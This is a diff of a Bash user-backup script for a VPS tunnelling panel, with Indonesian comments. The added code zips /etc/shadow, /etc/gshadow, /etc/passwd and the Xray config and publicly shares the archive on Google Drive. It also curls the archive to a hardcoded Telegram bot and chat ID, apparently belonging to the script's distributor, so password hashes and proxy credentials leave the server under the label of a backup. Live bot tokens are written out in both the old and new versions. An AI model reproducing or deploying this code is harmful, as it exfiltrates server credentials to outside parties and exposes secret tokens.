@@ -1,89 +1,83 @@
 #!/bin/bash
-# SL
-# ==========================================
-# Color
-RED='\033[0;31m'
+
+#COLOR CODE
 NC='\033[0m'
-GREEN='\033[0;32m'
-ORANGE='\033[0;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-LIGHT='\033[0;37m'
-# ==========================================
-AKUN="AKUN SSH"
+DEFBOLD='\e[39;1m'
+RB='\e[31;1m'
+GB='\e[32;1m'
+YB='\e[33;1m'
+BB='\033[0;36m'
+MB='\e[0;1m'
+CB='\e[35;1m'
+WB='\e[37;1m'
+
+# Info Token
 TIMES="10"
-CHATID="-923595763"
-KEY="6364118071:AAGM4r2YuCwlJng9l7Gh_DdAKKDmP3U-0Ik"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
-hariini=`date -d "0 days" +"%Y-%m-%d"`
-clear
-# Getting
-clear
+CHATID="5439907118"
+KEY="6079074982:AAG59dzsfG7nd8g7F_eLzdVab1_8nUfLCW8"
+URL="https://api.telegram.org/bot$KEY/sendDocument"
+
+# Info Domain
+domain=$(cat /etc/xray/domain) #Ganti directory Domain lu
 IP=$(wget -qO- ipinfo.io/ip);
 date=$(date +"%Y-%m-%d")
+time=$(date +'%H:%M:%S')
+
+# Backup User
 clear
-email=$(cat /home/email)
-if [[ "$email" = "" ]]; then
-echo "Masukkan Email Untuk Menerima Backup"
-read -rp "Email : " -e email
-cat <<EOF>>/home/email
-$email
-EOF
-fi
+echo -e "    ${BB}┌───────────────────────────────────────┐${NC}" | lolcat
+echo -e "    ${WB}        ──── [ ʙᴀᴄᴋᴜᴘ ᴜꜱᴇʀ ] ────        ${NC}" | lolcat
+echo -e "    ${BB}└───────────────────────────────────────┘${NC}" | lolcat
+sleep 1
+echo -e "    ${GB} [ɪɴꜰᴏ] ꜱᴛᴀʀᴛ ʙᴀᴄᴋᴜᴘ${NC}"
+
+# Create Backup Folder
+rm -rf /root/.backup
+mkdir -p /root/.backup
+mkdir -p /root/.backup/ssh
+mkdir -p /root/.backup/xray
+
+# Backup SSH
+cp -r /etc/passwd /root/.backup/ssh/ &> /dev/null
+cp -r /etc/group /root/.backup/ssh/ &> /dev/null
+cp -r /etc/shadow /root/.backup/ssh/ &> /dev/null
+cp -r /etc/gshadow /root/.backup/ssh/ &> /dev/null
+
+# Backup Xray
+cp -r /etc/xray/config.json /root/.backup/xray/ &> /dev/null
+
+# Compress to zip
+cd /root/.backup
+zip -r $IP-backup.zip * > /dev/null 2>&1
+
+# Send To Google-Drive (WAJIB PUNYA SCRIPT UPLOAD GOOGLE DRIVE)
+id=$(gdrive upload $IP-backup.zip | grep Uploaded | awk '{print $2}')
+gdrive share $id > /dev/null 2>&1
+link="https://docs.google.com/uc?export=download&id=${id}"
+
+# Send To Bot Notif
+curl -F chat_id="$CHATID" -F document=@"$IP-backup.zip" -F caption="ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴜꜱɪɴɢ ᴛʜɪꜱ ꜱᴄʀɪᴘᴛ
+ᴅᴏᴍᴀɪɴ : $domain
+ɪᴘ ᴠᴘꜱ : $IP
+ᴅᴀᴛᴇ   : $date
+ᴛɪᴍᴇ   : $time WIB
+ʟɪɴᴋ ɢᴏᴏɢʟᴇ : $link" $URL &> /dev/null
+echo -e "    ${GB} [ɪɴꜰᴏ] ꜱᴜᴄᴄᴇꜱꜱ ʙᴀᴄᴋᴜᴘ${NC}"
+sleep 1
+
+# Success Backup User
 clear
-figlet "Backup"
-echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
-rm -rf /root/backup
-mkdir /root/backup
-cp /etc/passwd backup/
-cp /etc/group backup/
-cp /etc/shadow backup/
-cp /etc/gshadow backup/
-cp -r /etc/xray backup/xray
-cp -r /root/nsdomain backup/nsdomain
-cp -r /etc/slowdns backup/slowdns
-cp -r /home/vps/public_html backup/public_html
-cd /root
-zip -r $IP-$date.zip backup > /dev/null 2>&1
-rclone copy /root/$IP-$date.zip dr:backup/
-url=$(rclone link dr:backup/$IP-$date.zip)
-id=(`echo $url | grep '^https' | cut -d'=' -f2`)
-link="https://drive.google.com/u/4/uc?id=${id}&export=download"
-echo -e "
-Detail Backup 
-==================================
-IP VPS        : $IP
-Link Backup   : $link
-Tanggal       : $date
-==================================
-" | mail -s "Backup Data" $email
-rm -rf /root/backup
-rm -r /root/$IP-$date.zip
-clear
-TEXT="
-<code>◇━━━━━━━━━━━━━━◇</code>
-<b>   ⚠️BACKUP NOTIF⚠️</b>
-<b>     Detail Backup VPS</b>
-<code>◇━━━━━━━━━━━━━━◇</code>
-<b>IP VPS  :</b> <code>${IP} </code>
-<b>DOMAIN :</b> <code>$(cat /etc/xray/domain)</code>
-<b>Tanggal : $date</b>
-<code>◇━━━━━━━━━━━━━━◇</code>
-<b>Link Backup   :</b> $link
-<code>◇━━━━━━━━━━━━━━◇</code>
-<code>Silahkan copy Link dan restore di VPS baru</code>
-<code>BY BOT : @WokszXD</code>
-"
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
-echo ""
-clear
-echo -e "
-Detail Backup 
-==================================
-IP VPS        : $IP
-Link Backup   : $link
-Tanggal       : $date
-==================================
-"
-echo "Silahkan cek Kotak Masuk $email"
+cd
+rm -rf /root/.backup
+echo -e "    ${BB}┌───────────────────────────────────────┐${NC}" | lolcat
+echo -e "    ${WB}        ──── [ ʙᴀᴄᴋᴜᴘ ᴜꜱᴇʀ ] ────        ${NC}" | lolcat
+echo -e "    ${BB}└───────────────────────────────────────┘${NC}" | lolcat
+echo -e "     ɪᴘ ᴠᴘꜱ       : $IP"
+echo -e "     ᴛᴀɴɢɢᴀʟ      : $date"
+echo -e "     ʟɪɴᴋ ʙᴀᴄᴋᴜᴘ  : $link"
+echo -e "    ${BB} ────────────────────────────────────────${NC}" | lolcat
+echo -e "    ${GB}        ᴘʟᴇᴀꜱᴇ ꜱᴀᴠᴇ ᴛʜᴇ ʟɪɴᴋ ᴀʙᴏᴠᴇ        ${NC}"
+echo -e "    ${BB} ────────────────────────────────────────${NC}" | lolcat
+echo -e ""
+read -n 1 -s -r -p "     ᴘʀᴇꜱꜱ ᴀɴʏ ᴋᴇʏ ᴛᴏ ʙᴀᴄᴋ ᴏɴ ᴍᴇɴᴜ"
+menu
